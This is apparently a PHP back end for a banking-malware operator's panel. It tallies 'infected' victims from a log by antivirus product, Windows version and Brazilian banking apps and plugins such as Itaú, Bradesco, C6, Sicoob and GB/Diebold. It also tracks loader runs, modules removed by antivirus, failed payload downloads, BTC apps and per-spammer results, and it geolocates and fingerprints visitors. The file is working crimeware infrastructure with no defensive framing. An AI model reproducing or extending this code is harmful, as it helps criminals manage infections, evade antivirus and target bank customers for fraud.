<?php
$arquivoContador = "FG45D1485045687031249123000273.txt";


function getBrowser() {

    global $userAgent;

    $browser        =   "Desconhecido";

    $browser_array  =   array(
                            '/msie/i'       =>  'Int. Explorer',
                            '/firefox/i'    =>  'Firefox',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/edge/i'       =>  'Edge',
                            '/opera/i'      =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
                            '/mobile/i'     =>  'Mobile'
                        );

    foreach ($browser_array as $regex => $value) { 

        if (preg_match($regex, $userAgent)) {
            $browser    =   $value;
        }

    }

    return $browser;

}

$userAgent = getUserAgent();

function getOS() { 

    global $userAgent;

    $os_platform    =   "OS Desconhecido";

    $os_array       =   array(
                            '/windows nt 10/i'      =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );

    foreach ($os_array as $regex => $value) { 

        if (preg_match($regex, $userAgent)) {
            $os_platform    =   $value;
        }

    }   

    return $os_platform;

}

function getGeo( $ip ) {

    if(strlen($ip) > 3 ) {

        try{
            $cURLConnection = curl_init();
    
            curl_setopt($cURLConnection, CURLOPT_URL, 'http://ip-api.com/json/' . $ip);
            curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($cURLConnection, CURLOPT_CONNECTTIMEOUT, 0); 
            curl_setopt($cURLConnection, CURLOPT_TIMEOUT, 5);
            $phoneList = curl_exec($cURLConnection);
            curl_close($cURLConnection);
            
            $jsonArrayResponse = json_decode($phoneList);
            return $jsonArrayResponse; 
        } catch (Exception $e) {
            return false;
        }
    }

    return "";
}

function ContarMcAffe(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
		if(strpos($line, "INFECTADO") !== false){
        if(strpos($line, "McAfee") !== false){
            $linecount++;
        }
		}
    }

    fclose($handle);

    return $linecount;
}

function ContarNorton(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
		if(strpos($line, "INFECTADO") !== false){
        if(strpos($line, "Norton") !== false){
            $linecount++;
        }
		}
    }

    fclose($handle);

    return $linecount;
}

function ContarBullguard(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
		if(strpos($line, "INFECTADO") !== false){
        if(strpos($line, "BullGuard") !== false){
            $linecount++;
        }
		}
    }

    fclose($handle);

    return $linecount;
}

function ContarMalwareBytes(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
		if(strpos($line, "INFECTADO") !== false){
        if(strpos($line, "Malwarebytes") !== false){
            $linecount++;
        }
		}
    }

    fclose($handle);

    return $linecount;
}

function ContarTotalAV(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
		if(strpos($line, "INFECTADO") !== false){
        if(strpos($line, "Total AV") !== false){
            $linecount++;
        }
		}
    }

    fclose($handle);

    return $linecount;
}


function Contar360security(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
		if(strpos($line, "INFECTADO") !== false){
        if(strpos($line, "360 Total Security") !== false){
            $linecount++;
        }
		}
    }

    fclose($handle);

    return $linecount;
}

function ContarComodo(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
		if(strpos($line, "INFECTADO") !== false){
        if(strpos($line, "Comodo") !== false){
            $linecount++;
        }
		}
    }

    fclose($handle);

    return $linecount;
}


function ContarEsetNod32(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
		if(strpos($line, "INFECTADO") !== false){
        if(strpos($line, "ESET Security") !== false){
            $linecount++;
        }
		}
    }

    fclose($handle);

    return $linecount;
}

function ContarAvast(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
		if(strpos($line, "INFECTADO") !== false){
        if(strpos($line, "Avast") !== false){
            $linecount++;
        }
		}
    }

    fclose($handle);

    return $linecount;
}

function ContarAVG(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
		if(strpos($line, "INFECTADO") !== false){
        if(strpos($line, "AVG") !== false){
            $linecount++;
        }
		}
    }

    fclose($handle);

    return $linecount;
}

function ContarAvira(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
		if(strpos($line, "INFECTADO") !== false){
        if(strpos($line, "Avira") !== false){
            $linecount++;
        }
		}
    }

    fclose($handle);

    return $linecount;
}

function ContarKaspersky(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
		if(strpos($line, "INFECTADO") !== false){
        if(strpos($line, "Kaspersky") !== false){
            $linecount++;
        }
		}
    }

    fclose($handle);

    return $linecount;
}

function ContarMSEssentials(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
		if(strpos($line, "INFECTADO") !== false){
        if(strpos($line, "Microsoft Essentials") !== false){
            $linecount++;
        }
		}
    }

    fclose($handle);

    return $linecount;
}

function ContarWinDefender(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
		if(strpos($line, "INFECTADO") !== false){
        if(strpos($line, "Windows Defender") !== false){
            $linecount++;
        }
		}
    }

    fclose($handle);

    return $linecount;
}

function contarBoots(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
        if(strpos($line, "BLOQUEADO") !== false){
            $linecount++;
        }
    }

    fclose($handle);

    return $linecount;
}

function contarWindows7(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
		if(strpos($line, "INFECTADO") !== false){
        if(strpos($line, "Windows 7") !== false){
            $linecount++;
        }
		}
    }

    fclose($handle);

    return $linecount;
}

function contarWindows8(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
		if(strpos($line, "INFECTADO") !== false){
        if(strpos($line, "Windows 8") !== false){
            $linecount++;
        }
		}
    }

    fclose($handle);

    return $linecount;
}

function contarWindowsXP(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
		if(strpos($line, "INFECTADO") !== false){
        if(strpos($line, "Windows XP") !== false){
            $linecount++;
        }
		}
    }

    fclose($handle);

    return $linecount;
}

function contarWindowsOnze(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
		if(strpos($line, "INFECTADO") !== false){
        if(strpos($line, "Windows 11") !== false){
            $linecount++;
        }
		}
    }

    fclose($handle);

    return $linecount;
}

function contarAppsBTC(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
        if(strpos($line, "(BTC)") !== false){
            $linecount++;
        }
    }

    fclose($handle);

    return $linecount;
}

function contarAppIta(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
		if(strpos($line, "INFECTADO") !== false){
         if(strpos($line, "AppItau") !== false) {
             $linecount++;
         } 
		 }
    }

    fclose($handle);

    return $linecount;
}

function contarNavBrada(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
		if(strpos($line, "INFECTADO") !== false){
        if(strpos($line, "AppBrada") !== false) {
            $linecount++;
        } 
		}
    }

    fclose($handle);

    return $linecount;
}

function contarAppC6(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
		if(strpos($line, "INFECTADO") !== false){
         if(strpos($line, "AppC6Bank") !== false) {
            $linecount++;
         } 
		}
    }

    fclose($handle);

    return $linecount;
}

function contarAppSicoob(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
		if(strpos($line, "INFECTADO") !== false){
          if(strpos($line, "AppSicob") !== false) {
            $linecount++;
        } 
        }
        
    }

    fclose($handle);

    return $linecount;
}

function contarGB(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
		if(strpos($line, "INFECTADO") !== false){
           if(strpos($line, "GB-Topaz") || strpos($line, "GB-Diebold") !== false) 
		   {
            $linecount++;
           } 
        }
        
    }

    fclose($handle);

    return $linecount;
}

function contarOutlook(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
		if(strpos($line, "INFECTADO") !== false){
           if(strpos($line, "Outlook") !== false) 
		   {		   
            $linecount++;
           }
        }
        
    }

    fclose($handle);

    return $linecount;
}

function contarWindows10(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
		if(strpos($line, "INFECTADO") !== false){
        if(strpos($line, "Windows 10") !== false){
            $linecount++;
        }
		}
    }

    fclose($handle);

    return $linecount;
}

function contarLiberados(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
        if(strpos($line, "INFECTADO") !== false){
            $linecount++;
        }
    }

    fclose($handle);

    return $linecount;
}

function contarEXECUCOES(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
        if(strpos($line, "CONFIRMOU_LOADER") !== false){
            $linecount++;
        }
    }

    fclose($handle);

    return $linecount;
}

function contarFechouLoader(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
        if(strpos($line, "FECHOU_LOADER") !== false){
            $linecount++;
        }
    }

    fclose($handle);

    return $linecount;
}

function contarAntiComeu(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
        if(strpos($line, "AV_COMEU_MODULO") !== false){
            $linecount++;
        }
    }

    fclose($handle);

    return $linecount;
}

function contarFalhas(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
        if(strpos($line, "NAO_EXECUTO_MODULO") || strpos($line, "FALHA_DOWNLOAD") !== false){
            $linecount++;
        }
    }

    fclose($handle);

    return $linecount;
}

function contarRecuperados(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
        if(strpos($line, "RECUPERADO") !== false){
            $linecount++;
        }
    }

    fclose($handle);

    return $linecount;
}

function contarRepetidos(){
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
        if(strpos($line, "REPETIDO") !== false){
            $linecount++;
        }
    }

    fclose($handle);

    return $linecount;
}

function contarTotal() {
    global $arquivoContador;
    $linecount = 0;
    $handle = fopen($arquivoContador, "r");
    while(!feof($handle)){
        $line = fgets($handle);
        if(strlen($line)) {
            $linecount++;
        }
    }

    fclose($handle);

    return $linecount;
}

function getUserAgent() {
    return $_SERVER['HTTP_USER_AGENT'];
}

function addBloqueado($ip) {
    global $arquivoBloqueados;
    file_put_contents($arquivoBloqueados, trim($ip).PHP_EOL, FILE_APPEND);
}
function getIp() {
    return @$_SERVER[REMOTE_ADDR];
    // return "81.214.48.17";
}

function ShowSpmmr() {
    global $arquivoContador;
    $handle = fopen($arquivoContador, 'r');

    if ($handle) {
        $lastWords = array();
        while (($line = fgets($handle)) !== false) {
            $fields = explode('|', $line);
            $lastField = end($fields);
            $words = explode(' ', trim($lastField));
            $lastWord = end($words);

            if (!in_array($lastWord, $lastWords)) {
                $lastWords[] = $lastWord;
            }
        }
        fclose($handle);
        return $lastWords;
    }
}

function contarOcorrencias($stringProcurada) {
    global $arquivoContador;
    $arquivo = fopen($arquivoContador, 'r');
    
    if ($arquivo) {
        $contador = 0;
        while (($linha = fgets($arquivo)) !== false) {
            // Verifica se a string procurada está presente na linha
            if (stripos($linha, $stringProcurada) !== false) {
                $contador++;
            }
        }
    
        fclose($arquivo);
        return $contador;
    }
}

function list_per_spammer($keyword){
    global $arquivoContador;
    $arquivo = fopen($arquivoContador, 'r');
    $data = [];
    if ($arquivo) {
        while (($line = fgets($arquivo)) !== false) {
            if (stripos($line, $keyword) !== false) {
                array_push($data, $line);
                //echo $line."<br>";
            }
        }
        fclose($arquivo);
    }
    return $data;
}
